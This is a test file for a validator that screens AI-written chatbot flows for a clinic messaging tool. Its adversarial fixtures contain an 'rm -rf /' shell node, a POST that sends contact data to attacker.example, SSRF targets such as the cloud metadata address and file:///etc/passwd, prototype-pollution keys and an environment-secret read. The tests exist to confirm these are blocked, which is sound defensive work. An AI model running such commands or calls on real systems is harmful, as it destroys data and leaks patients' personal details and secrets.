import { describe, expect, it } from "vitest";

import { AI_FLOW_LIMITS } from "@/lib/ai/flow-copilot/policy";
import { validateCopilotOutput, type FlowValidation } from "@/lib/ai/flow-copilot/validate";
import { MAX_STEPS } from "@/lib/flow-engine/types";

type Ok = Extract<FlowValidation, { ok: true }>;

const base = () => ({
  name: "Booking helper",
  description: "Greets, asks about booking, hands over.",
  trigger: { type: "conversation_opened", config: {} },
  nodes: [
    { id: "trigger", type: "trigger" },
    {
      id: "hello",
      type: "message",
      data: { text: "Hello {contact.first_name}, how can we help?" },
    },
    {
      id: "ask",
      type: "question",
      data: {
        text: "Would you like to book a visit?",
        style: "buttons",
        options: [
          { id: "yes", title: "Yes" },
          { id: "no", title: "No" },
        ],
        variable: "answer",
      },
    },
    { id: "hand", type: "assign_to", data: { target: { type: "team" } } },
    { id: "bye", type: "message", data: { text: "No problem. Message us any time." } },
    { id: "end", type: "end_flow" },
  ],
  edges: [
    { source: "trigger", target: "hello", handle: "default" },
    { source: "hello", target: "ask", handle: "default" },
    { source: "ask", target: "hand", handle: "option:yes" },
    { source: "ask", target: "bye", handle: "option:no" },
    { source: "bye", target: "end", handle: "default" },
  ],
});

type Raw = ReturnType<typeof base>;
const run = (v: unknown, roles: string[] = ["Receptionist"]) =>
  validateCopilotOutput(typeof v === "string" ? v : JSON.stringify(v), { roleNames: roles });
const errorsOf = (r: FlowValidation) => (r.ok ? [] : r.errors);
const mutate = (f: (b: Raw) => void): Raw => {
  const b = base();
  f(b);
  return b;
};

describe("a well-formed answer", () => {
  it("passes the engine's graph validator and is laid out for the canvas", () => {
    const r = run(base());
    expect(r.ok).toBe(true);
    const ok = r as Ok;
    expect(ok.flow.triggerType).toBe("conversation_opened");
    expect(ok.flow.graph.nodes).toHaveLength(6);
    const xs = new Set(ok.flow.graph.nodes.map((n) => n.position.x));
    expect(xs.size).toBeGreaterThan(2);
    // sequential, unique positions per layer
    const trigger = ok.flow.graph.nodes.find((n) => n.type === "trigger")!;
    expect(trigger.position).toEqual({ x: 0, y: 0 });
  });

  it("leaves the team to a person and says so (the builder's Checks panel will highlight it)", () => {
    const ok = run(base()) as Ok;
    expect(ok.needs.teams.map((n) => n.nodeId)).toEqual(["hand"]);
    expect(ok.issues.some((i) => i.nodeId === "hand" && i.kind === "setup")).toBe(true);
    const hand = ok.flow.graph.nodes.find((n) => n.id === "hand")!;
    expect(hand.data).toEqual({ target: { type: "team", id: "" } });
  });

  it("never invents a template id: the model's choice is replaced by a blank for a person to pick", () => {
    const b = mutate((x) => {
      x.nodes.push({
        id: "tpl",
        type: "template",
        data: {
          template_id: "00000000-0000-4000-8000-000000000001",
          purpose: "appointment reminder",
        } as never,
      });
      x.edges.push({ source: "end", target: "tpl", handle: "default" });
    });
    // end_flow has no outputs: use a branch of the flow instead
    b.edges.pop();
    b.edges.push({ source: "bye", target: "tpl", handle: "fallback" });
    const ok = run(b) as Ok;
    expect(ok.ok).toBe(true);
    const tpl = ok.flow.graph.nodes.find((n) => n.id === "tpl")!;
    expect(tpl.data.template_id).toBe("");
    expect(ok.needs.templates).toEqual([{ nodeId: "tpl", hint: "appointment reminder" }]);
  });

  it("accepts a reply wrapped in a markdown fence", () => {
    expect(run("```json\n" + JSON.stringify(base()) + "\n```").ok).toBe(true);
  });

  it("maps a role the clinic really has, and leaves an unknown one for a person to choose", () => {
    const withNotify = (role: string) =>
      mutate((x) => {
        x.nodes.push({
          id: "tell",
          type: "send_notification",
          data: { title: "New request", body: "", target: { type: "role", id: role } } as never,
        });
        x.edges.push({ source: "hello", target: "tell", handle: "fallback" });
      });
    const known = run(withNotify("receptionist")) as Ok;
    expect(known.flow.graph.nodes.find((n) => n.id === "tell")!.data.target).toEqual({
      type: "role",
      id: "Receptionist",
    });
    const unknown = run(withNotify("Chief Wizard")) as Ok;
    expect(unknown.ok).toBe(true);
    expect(unknown.needs.people.map((n) => n.nodeId)).toEqual(["tell"]);
  });
});

describe("adversarial model output: shape and size", () => {
  it("rejects text that is not JSON, an array, or nothing", () => {
    expect(errorsOf(run("here is your flow: hello"))[0]).toMatch(/not JSON/);
    expect(errorsOf(run("[]")).length).toBeGreaterThan(0);
    expect(errorsOf(run(""))[0]).toMatch(/nothing/);
    expect(errorsOf(run("{ not json }"))[0]).toMatch(/valid JSON/);
  });

  it("rejects an oversized reply before parsing it", () => {
    const huge = JSON.stringify({
      ...base(),
      description: "x".repeat(AI_FLOW_LIMITS.maxRawChars + 10),
    });
    expect(errorsOf(run(huge))[0]).toMatch(/too large/);
  });

  it("rejects too many nodes (extra nodes) and far too many (over the engine's step limit)", () => {
    const many = (n: number) => {
      const b = base();
      for (let i = 0; i < n; i++)
        b.nodes.push({ id: `m${i}`, type: "message", data: { text: "hi" } });
      return b;
    };
    expect(errorsOf(run(many(AI_FLOW_LIMITS.maxNodes)))[0]).toMatch(/limit is 40/);
    const r = run(many(MAX_STEPS + 50));
    expect(r.ok).toBe(false);
    expect(errorsOf(r)[0]).toMatch(/limit is 40/);
  });

  it("rejects too many connections", () => {
    const b = base();
    for (let i = 0; i < AI_FLOW_LIMITS.maxEdges + 1; i++)
      b.edges.push({ source: "hello", target: "ask", handle: "default" });
    expect(errorsOf(run(b))[0]).toMatch(/connections/);
  });

  it("rejects unknown node types", () => {
    const b = mutate((x) =>
      x.nodes.push({ id: "evil", type: "shell_command", data: { cmd: "rm -rf /" } as never }),
    );
    expect(errorsOf(run(b)).join(" ")).toMatch(/unknown type "shell_command"/);
  });

  it("rejects a node type the model should not create (not stripped silently into something else)", () => {
    const b = mutate((x) => {
      x.nodes.push({ id: "fn", type: "trigger" });
    });
    expect(errorsOf(run(b)).join(" ")).toMatch(/one trigger/i);
  });

  it("rejects dangling edges", () => {
    const b = mutate((x) => x.edges.push({ source: "hello", target: "ghost", handle: "fallback" }));
    expect(errorsOf(run(b)).join(" ")).toMatch(/does not exist/);
    const c = mutate((x) => x.edges.push({ source: "ghost", target: "hello", handle: "default" }));
    expect(errorsOf(run(c)).join(" ")).toMatch(/does not exist/);
  });

  it("rejects several triggers and a missing trigger", () => {
    const two = mutate((x) => x.nodes.push({ id: "trigger2", type: "trigger" }));
    expect(run(two).ok).toBe(false);
    const none = mutate((x) => {
      x.nodes = x.nodes.filter((n) => n.type !== "trigger");
      x.edges = x.edges.filter((e) => e.source !== "trigger");
    });
    expect(errorsOf(run(none)).join(" ")).toMatch(/exactly one trigger/i);
  });

  it("rejects duplicate ids and ids that are not safe identifiers", () => {
    const dup = mutate((x) =>
      x.nodes.push({ id: "hello", type: "message", data: { text: "again" } }),
    );
    expect(errorsOf(run(dup)).join(" ")).toMatch(/used twice/);
    for (const id of ["__proto__", "has space", "1abc", "a".repeat(80), "<script>"]) {
      const b = mutate((x) => x.nodes.push({ id, type: "message", data: { text: "x" } }));
      expect(errorsOf(run(b)).join(" ")).toMatch(/not allowed/);
    }
  });

  it("does not let a __proto__ key in the reply pollute anything", () => {
    const text = JSON.stringify(base()).replace('"name"', '"__proto__":{"polluted":true},"name"');
    run(text);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });
});

describe("adversarial model output: loops", () => {
  it("rejects a loop between steps (it would run until the engine's 200-step stop)", () => {
    const b = mutate((x) => x.edges.push({ source: "bye", target: "hello", handle: "fallback" }));
    expect(errorsOf(run(b)).join(" ")).toMatch(/loops back to step/);
  });

  it("rejects a step connected to itself", () => {
    const b = mutate((x) => x.edges.push({ source: "hello", target: "hello", handle: "fallback" }));
    expect(errorsOf(run(b)).join(" ")).toMatch(/connected to itself/);
  });

  it("rejects an endless wait-and-send cycle", () => {
    const b = {
      name: "spam",
      trigger: { type: "shortcut" },
      nodes: [
        { id: "trigger", type: "trigger" },
        { id: "msg", type: "message", data: { text: "Reminder" } },
        { id: "pause", type: "wait", data: { amount: 1, unit: "minutes" } },
      ],
      edges: [
        { source: "trigger", target: "msg" },
        { source: "msg", target: "pause" },
        { source: "pause", target: "msg" },
      ],
    };
    expect(errorsOf(run(b)).join(" ")).toMatch(/loops back/);
  });
});

describe("adversarial model output: destructive or exfiltrating steps are stripped, never kept", () => {
  const withApi = (url: string) =>
    mutate((x) => {
      x.nodes.splice(2, 0, {
        id: "send_out",
        type: "api_action",
        data: {
          method: "POST",
          url,
          headers: { Authorization: "Bearer stolen" },
          body: "{contact.full_name} {contact.email}",
        } as never,
      });
      x.edges = x.edges.filter((e) => !(e.source === "hello" && e.target === "ask"));
      x.edges.push(
        { source: "hello", target: "send_out", handle: "default" },
        { source: "send_out", target: "ask", handle: "default" },
      );
    });

  it("removes an api_action to an arbitrary URL and joins the flow around it", () => {
    const r = run(withApi("https://attacker.example/collect"));
    expect(r.ok).toBe(true);
    const ok = r as Ok;
    expect(ok.flow.graph.nodes.some((n) => n.type === "api_action")).toBe(false);
    expect(ok.flow.graph.edges.some((e) => e.source === "hello" && e.target === "ask")).toBe(true);
    expect(JSON.stringify(ok.flow)).not.toContain("attacker.example");
    expect(JSON.stringify(ok.flow)).not.toContain("stolen");
    expect(ok.notes.join(" ")).toMatch(/API action/);
  });

  it("removes api_action aimed at internal addresses too (the SSRF policy is 'no AI-written calls at all')", () => {
    for (const url of [
      "http://169.254.169.254/latest/meta-data",
      "https://localhost:8080",
      "file:///etc/passwd",
    ]) {
      const ok = run(withApi(url)) as Ok;
      expect(ok.ok).toBe(true);
      expect(ok.flow.graph.nodes.some((n) => n.type === "api_action")).toBe(false);
    }
  });

  it("removes portal_record, run_flow, book_appointment, create_enquiry and add_task steps", () => {
    for (const type of [
      "portal_record",
      "run_flow",
      "book_appointment",
      "create_enquiry",
      "add_task",
    ]) {
      const b = mutate((x) => {
        x.nodes.push({ id: "x1", type, data: { anything: "yes" } as never });
        x.edges.push({ source: "hello", target: "x1", handle: "fallback" });
      });
      const ok = run(b) as Ok;
      expect(ok.ok).toBe(true);
      expect(ok.flow.graph.nodes.some((n) => n.type === type)).toBe(false);
    }
  });

  it("does not let extra keys ride along on an allowed node (url, headers, secrets)", () => {
    const b = mutate((x) => {
      x.nodes[1] = {
        id: "hello",
        type: "message",
        data: {
          text: "Hi",
          url: "https://attacker.example",
          headers: { a: "b" },
          __proto__: { x: 1 },
        } as never,
      };
    });
    const ok = run(b) as Ok;
    expect(ok.ok).toBe(true);
    expect(ok.flow.graph.nodes.find((n) => n.id === "hello")!.data).toEqual({ text: "Hi" });
  });

  it("refuses the webhook and recurring triggers: nobody is present to review what they start", () => {
    for (const type of ["webhook", "recurring", "conversation_ai_tagged", "made_up"]) {
      const b = base();
      b.trigger = { type, config: {} };
      expect(errorsOf(run(b)).join(" ")).toMatch(/not allowed in a draft/);
    }
  });

  it("only lets a draft set the contact's label or language", () => {
    const b = (field: string) =>
      mutate((x) => {
        x.nodes.push({
          id: "upd",
          type: "update_contact_field",
          data: { field, value: "x" } as never,
        });
        x.edges.push({ source: "hello", target: "upd", handle: "fallback" });
      });
    expect(run(b("label")).ok).toBe(true);
    expect(run(b("phone")).ok).toBe(false);
    expect(run(b("email")).ok).toBe(false);
    expect(run(b("custom.x")).ok).toBe(false);
  });

  it("only lets a branch read run values, not the environment", () => {
    const b = mutate((x) => {
      x.nodes.push({
        id: "br",
        type: "branch",
        data: {
          logic: "and",
          conditions: [{ left: "process.env.SECRET", op: "eq", right: "1" }],
        } as never,
      });
      x.edges.push({ source: "hello", target: "br", handle: "fallback" });
    });
    expect(errorsOf(run(b)).join(" ")).toMatch(/must read a value like/);
  });
});

describe("adversarial model output: clinical content and links", () => {
  const withText = (text: string) =>
    mutate((x) => {
      x.nodes[1] = { id: "hello", type: "message", data: { text } };
    });

  it("rejects bot messages that give a dose, a medication instruction or a diagnosis", () => {
    for (const text of [
      "Take 500 mg of paracetamol twice a day.",
      "You should stop taking your medication.",
      "It sounds like an infection, you probably have a virus.",
      "خذ 2 حبة كل ثماني ساعات",
    ]) {
      expect(errorsOf(run(withText(text))).join(" ")).toMatch(/must not give medical advice/);
    }
  });

  it("notes a link in patient-facing text for review rather than silently shipping it", () => {
    const ok = run(withText("Pay here: https://pay.example/now")) as Ok;
    expect(ok.ok).toBe(true);
    expect(ok.notes.join(" ")).toMatch(/contains a link/);
  });

  it("notes a variable it does not know", () => {
    const ok = run(withText("Hello {secret.token}")) as Ok;
    expect(ok.notes.join(" ")).toMatch(/not a known variable/);
  });
});

describe("structure the engine would not accept", () => {
  it("rejects buttons with more than three options and options the question does not offer", () => {
    const four = mutate((x) => {
      (x.nodes[2]!.data as { options: unknown[] }).options.push(
        { id: "c", title: "C" },
        { id: "d", title: "D" },
      );
    });
    expect(run(four).ok).toBe(false);
    const missing = mutate((x) =>
      x.edges.push({ source: "ask", target: "end", handle: "option:maybe" }),
    );
    expect(errorsOf(run(missing)).join(" ")).toMatch(/does not offer/);
  });

  it("rejects waits over the 30 day limit and non-positive waits", () => {
    const wait = (amount: number, unit: string) =>
      mutate((x) => {
        x.nodes.push({ id: "w", type: "wait", data: { amount, unit } as never });
        x.edges.push({ source: "hello", target: "w", handle: "fallback" });
      });
    expect(run(wait(2, "hours")).ok).toBe(true);
    expect(errorsOf(run(wait(40, "days"))).join(" ")).toMatch(/longer than 30 days/);
    expect(run(wait(-1, "hours")).ok).toBe(false);
    expect(run(wait(1, "fortnights")).ok).toBe(false);
  });

  it("removes steps nothing leads to instead of keeping dead weight", () => {
    const b = mutate((x) =>
      x.nodes.push({ id: "island", type: "message", data: { text: "Unreachable" } }),
    );
    const ok = run(b) as Ok;
    expect(ok.ok).toBe(true);
    expect(ok.flow.graph.nodes.some((n) => n.id === "island")).toBe(false);
    expect(ok.notes.join(" ")).toMatch(/Removed 1 step/);
  });

  it("keeps only valid trigger conditions", () => {
    const b = base();
    b.trigger = {
      type: "conversation_opened",
      config: {
        conditions: {
          logic: "and",
          conditions: [{ category: "keyword", op: "contains", value: "book" }],
        },
      },
    };
    expect((run(b) as Ok).flow.triggerConfig).toEqual({
      conditions: {
        logic: "and",
        conditions: [{ category: "keyword", op: "contains", value: "book" }],
      },
    });
    b.trigger = {
      type: "conversation_opened",
      config: {
        conditions: { logic: "xor", conditions: [{ category: "password", op: "eq", value: "x" }] },
      },
    };
    expect(run(b).ok).toBe(false);
  });
});
